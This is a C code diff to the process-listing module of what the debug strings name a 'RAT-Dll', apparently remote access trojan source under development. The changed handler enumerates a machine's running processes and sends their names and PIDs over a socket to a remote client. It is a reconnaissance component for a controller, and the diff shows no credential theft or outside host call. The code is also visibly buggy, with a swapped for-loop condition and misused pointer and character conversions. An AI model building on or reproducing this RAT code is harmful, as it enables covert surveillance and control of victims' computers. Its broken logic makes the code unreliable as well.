@@ -27,6 +27,9 @@ INT handleProcessList(SOCKET clientSock)
 		 OutputDebugStringA(msgBuf);
 		 goto cleanup;
 	 }
+
+	 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending %d processes\n", numProcesses);
+	 OutputDebugStringA(msgBuf);
 	  
 	 // Send back the number of processes we found first 
 	 status = send(clientSock, (const char*)&numProcesses, sizeof(INT), 0);
@@ -41,6 +44,9 @@ INT handleProcessList(SOCKET clientSock)
 	 // Iterate through each list, send the process name and the PID
 	 for (int i = 0; i++; i < numProcesses)
 	 {
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending process %s\n", processNames[i]);
+		 OutputDebugStringA(msgBuf);
+
 		 status = send(clientSock, processNames[i], sizeof(processNames[i]), 0);
 		 if (status == SOCKET_ERROR)
 		 {
@@ -49,6 +55,9 @@ INT handleProcessList(SOCKET clientSock)
 			 status = WSAGetLastError();
 			 goto cleanup;
 		 }
+
+		 sprintf_s(msgBuf, "RAT-Dll-Process::handleProcessList - Sending PID %d\n", processPIDs[i]);
+		 OutputDebugStringA(msgBuf);
 
 		 status = send(clientSock, (const char*)processPIDs[i], sizeof(DWORD), 0);
 		 if (status == SOCKET_ERROR)
@@ -83,7 +92,7 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 	INT status = SUCCESS;
 	DWORD aProcesses [1024], cbNeeded = 0, cProcesses = 0;
 	CHAR msgBuf[DEFAULT_BUF_LEN];
-	TCHAR szProcessName[MAX_PATH];
+	CHAR szProcessName[MAX_PATH];
 	UINT64 i;
 
 	// Return value should be non-zero
@@ -97,9 +106,6 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 
 	// TODO: Could call EnumProcessModulesEx for module information...
 	cProcesses = cbNeeded / sizeof(DWORD);
-
-	sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Found %d processes!\n", cProcesses);
-	OutputDebugStringA(msgBuf);
 
 	*numProcesses = cProcesses;
 
@@ -137,21 +143,21 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 				// Get process name
 				if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
 				{
-					GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(TCHAR));
+					GetModuleBaseNameA(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(CHAR));
 
-					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s with PID %d\n", szProcessName[i], aProcesses[i]);
+					sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Process %s with PID %d\n", szProcessName, aProcesses[i]);
 					OutputDebugStringA(msgBuf);
 
 					// Copy over this base name
-					*processNames[i] = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(TCHAR));
-					if (*processNames[i] == NULL)
+					**processNames = (CHAR*)malloc(sizeof(char) * sizeof(szProcessName) / sizeof(CHAR));
+					if (**processNames == NULL)
 					{
 						OutputDebugStringA("RAT-Dll-Process::doProcessList - Failed to allocate enough memory!\n");
 						status = FAILURE;
 						goto cleanup;
 					}
 
-					if (!wctomb(*processNames[i], *szProcessName))
+					if (!wctomb(**processNames, *szProcessName))
 					{
 						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from wctomb %d\n", status);
 						OutputDebugStringA(msgBuf);
@@ -160,13 +166,17 @@ INT doProcessList(__out CHAR*** processNames, __out DWORD** processPIDs, __out I
 					}
 
 					// We already have the PID so copy that as well
-					if (!memcpy(processPIDs[i], &aProcesses[i], sizeof(DWORD)))
+					if (!memcpy(*processPIDs, &aProcesses[i], sizeof(DWORD)))
 					{
 						sprintf_s(msgBuf, "RAT-Dll-Process::doProcessList - Failure received from memcpy %d\n", status);
 						OutputDebugStringA(msgBuf);
 						status = FAILURE;
 						goto cleanup;
 					}
+
+					// Increment pointers to get to next address space 
+					(**processNames)++;
+					(*processPIDs)++;
 				}
 
 				CloseHandle(hProcess);
